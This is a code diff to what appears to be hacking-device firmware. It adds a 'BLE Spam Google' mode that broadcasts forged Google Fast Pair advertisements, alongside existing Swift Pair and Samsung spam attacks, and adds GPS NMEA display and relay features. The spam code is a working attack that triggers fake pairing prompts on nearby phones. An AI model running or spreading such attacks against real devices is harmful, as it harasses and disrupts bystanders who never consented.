@@ -105,7 +105,25 @@ extern "C" {
         break;
       }
       case Google: {
-        // TODO Google
+        AdvData_Raw = new uint8_t[14];
+        AdvData_Raw[i++] = 3;
+        AdvData_Raw[i++] = 0x03;
+        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
+        AdvData_Raw[i++] = 0xFE;
+
+        AdvData_Raw[i++] = 6;
+        AdvData_Raw[i++] = 0x16;
+        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
+        AdvData_Raw[i++] = 0xFE;
+        AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
+        AdvData_Raw[i++] = 0xB7;
+        AdvData_Raw[i++] = 0x27;
+
+        AdvData_Raw[i++] = 2;
+        AdvData_Raw[i++] = 0x0A;
+        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+
+        AdvData.addData(std::string((char *)AdvData_Raw, 14));
         break;
       }
       default: {
@@ -551,7 +569,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
   }
   else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
            (scan_mode == BT_ATTACK_SPAM_ALL) ||
-           (scan_mode == BT_ATTACK_SAMSUNG_SPAM)) {
+           (scan_mode == BT_ATTACK_SAMSUNG_SPAM) ||
+           (scan_mode == BT_ATTACK_GOOGLE_SPAM)) {
     #ifdef HAS_BT
       RunSwiftpairSpam(scan_mode, color);
     #endif
@@ -570,6 +589,11 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
   else if (scan_mode == LV_ADD_SSID) {
     #ifdef HAS_SCREEN
       RunLvJoinWiFi(scan_mode, color);
+    #endif
+  }
+  else if (scan_mode == WIFI_SCAN_GPS_NMEA){
+    #ifdef HAS_GPS
+      gps_obj.enable_queue();
     #endif
   }
 
@@ -731,6 +755,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
   (currentScanMode == BT_ATTACK_SPAM_ALL) ||
   (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
+  (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
   (currentScanMode == BT_SCAN_SKIMMERS))
@@ -749,6 +774,10 @@ void WiFiScan::StopScan(uint8_t scan_mode)
     Serial.println(display_obj.display_buffer->size());
   
     display_obj.tteBar = false;
+  #endif
+
+  #ifdef HAS_GPS
+    gps_obj.disable_queue();
   #endif
 }
 
@@ -1122,6 +1151,8 @@ void WiFiScan::RunGenerateSSIDs(int count) {
 
 void WiFiScan::RunGPSInfo() {
   #ifdef HAS_GPS
+    String text=gps_obj.getText();
+
     Serial.println("Refreshing GPS Data on screen...");
     #ifdef HAS_SCREEN
 
@@ -1143,7 +1174,10 @@ void WiFiScan::RunGPSInfo() {
       else
         display_obj.tft.println("  Good Fix: No");
         
+      if(text != "") display_obj.tft.println("      Text: " + text);
+
       display_obj.tft.println("Satellites: " + gps_obj.getNumSatsString());
+      display_obj.tft.println("  Accuracy: " + (String)gps_obj.getAccuracy());
       display_obj.tft.println("  Latitude: " + gps_obj.getLat());
       display_obj.tft.println(" Longitude: " + gps_obj.getLon());
       display_obj.tft.println("  Altitude: " + (String)gps_obj.getAlt());
@@ -1157,11 +1191,94 @@ void WiFiScan::RunGPSInfo() {
     else
       Serial.println("  Good Fix: No");
       
+    if(text != "") Serial.println("      Text: " + text);
+
     Serial.println("Satellites: " + gps_obj.getNumSatsString());
+    Serial.println("  Accuracy: " + (String)gps_obj.getAccuracy());
     Serial.println("  Latitude: " + gps_obj.getLat());
     Serial.println(" Longitude: " + gps_obj.getLon());
     Serial.println("  Altitude: " + (String)gps_obj.getAlt());
     Serial.println("  Datetime: " + gps_obj.getDatetime());
+  #endif
+}
+
+void WiFiScan::RunGPSNmea() {
+  #ifdef HAS_GPS
+    LinkedList<String> *buffer=gps_obj.get_queue();
+    bool queue_enabled=gps_obj.queue_enabled();
+
+    if(!buffer||!queue_enabled)
+      gps_obj.flush_queue();
+    #ifndef HAS_SCREEN
+      else
+        gps_obj.flush_text();
+    #else
+      // Get screen position ready
+      display_obj.tft.setTextWrap(true);
+      display_obj.tft.setFreeFont(NULL);
+      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
+      display_obj.tft.setTextSize(1);
+      display_obj.tft.setTextColor(TFT_CYAN);
+
+      // Clean up screen first
+      display_obj.tft.fillRect(0, (SCREEN_HEIGHT / 3) - 6, SCREEN_WIDTH, SCREEN_HEIGHT - ((SCREEN_HEIGHT / 3) - 6), TFT_BLACK);
+
+      display_obj.tft.setCursor(0, SCREEN_HEIGHT / 3);
+
+      String text=gps_obj.getText();
+      if(queue_enabled){
+        if(gps_obj.getTextQueueSize()>0)
+          display_obj.tft.print(gps_obj.getTextQueue());
+        else
+          if(text != "") display_obj.tft.print(text);
+      }
+      else
+        if(text != "") display_obj.tft.print(text);
+
+      //This one doesn't contain self-genned GxGGA or GxRMC, nor does it contain GxTXT, processed above
+      String display_nmea_sentence=gps_obj.getNmeaNotparsed();
+    #endif
+
+    if(buffer && queue_enabled){
+      int size=buffer->size();
+      if(size){
+        gps_obj.new_queue();
+        for(int i=0;i<size;i++){
+          Serial.println(buffer->get(i));
+        }
+        delete buffer;
+      }
+
+      #ifdef HAS_SCREEN
+        //This matches the else block, but could later display more of the queue...
+        display_obj.tft.print(display_nmea_sentence);
+      #endif
+    } else {
+      static String old_nmea_sentence="";
+      String nmea_sentence=gps_obj.getNmeaNotimp();
+
+      if(nmea_sentence != "" && nmea_sentence != old_nmea_sentence){
+        old_nmea_sentence=nmea_sentence;
+        Serial.println(nmea_sentence);
+      }
+
+      #ifdef HAS_SCREEN
+        display_obj.tft.print(display_nmea_sentence);
+      #endif
+    }
+
+    String gxgga = gps_obj.generateGXgga();
+    String gxrmc = gps_obj.generateGXrmc();
+
+    #ifdef HAS_SCREEN
+      display_obj.tft.print(gxgga);
+      display_obj.tft.print(gxrmc);
+      display_obj.tft.setTextWrap(false);
+    #endif
+
+    gps_obj.sendSentence(Serial, gxgga.c_str());
+    gps_obj.sendSentence(Serial, gxrmc.c_str());
+
   #endif
 }
 
@@ -1993,6 +2110,8 @@ void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
           display_obj.tft.drawCentreString("BLE Spam All",120,16,2);
         else if (scan_mode == BT_ATTACK_SAMSUNG_SPAM)
           display_obj.tft.drawCentreString("BLE Spam Samsung",120,16,2);
+        else if (scan_mode == BT_ATTACK_GOOGLE_SPAM)
+          display_obj.tft.drawCentreString("BLE Spam Google",120,16,2);
         display_obj.touchToExit();
       #endif
       display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
@@ -4341,7 +4460,8 @@ void WiFiScan::main(uint32_t currentTime)
   else if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
            (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
            (currentScanMode == BT_ATTACK_SPAM_ALL) ||
-           (currentScanMode == BT_ATTACK_SAMSUNG_SPAM)) {
+           (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
+           (currentScanMode == BT_ATTACK_GOOGLE_SPAM)) {
     #ifdef HAS_BT
       if (currentTime - initTime >= 1000) {
         initTime = millis();
@@ -4356,6 +4476,10 @@ void WiFiScan::main(uint32_t currentTime)
           display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
         #endif
       }
+
+      if ((currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
+          (currentScanMode == BT_ATTACK_SPAM_ALL))
+        this->executeSwiftpairSpam(Google);
 
       if ((currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL))
@@ -4384,6 +4508,12 @@ void WiFiScan::main(uint32_t currentTime)
     if (currentTime - initTime >= 5000) {
       this->initTime = millis();
       this->RunGPSInfo();
+    }
+  }
+  else if (currentScanMode == WIFI_SCAN_GPS_NMEA) {
+    if (currentTime - initTime >= 1000) {
+      this->initTime = millis();
+      this->RunGPSNmea();
     }
   }
   else if (currentScanMode == WIFI_SCAN_EVIL_PORTAL) {
